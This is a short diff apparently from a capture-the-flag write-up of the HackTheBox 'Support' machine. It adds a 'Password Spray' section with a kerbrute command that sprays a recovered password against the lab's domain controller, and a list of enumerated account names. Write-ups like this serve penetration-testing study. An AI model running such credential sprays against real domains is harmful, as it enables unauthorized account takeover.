@@ -13,3 +13,15 @@ maxPwdAge: [b'-9223372036854775808']
 minPwdLength: [b'7']
 modifiedCount: [b'1']
 ```
+# Password Spray
+
+```$ kerbrute passwordspray -d support.htb --dc 10.10.11.174 loot/users.txt 'Ironside47pleasure40Watchful'```
+```loot/users.txt```
+```
+Administrator
+Guest
+krbtgt
+ldap
+support
+ford.victoria
+```
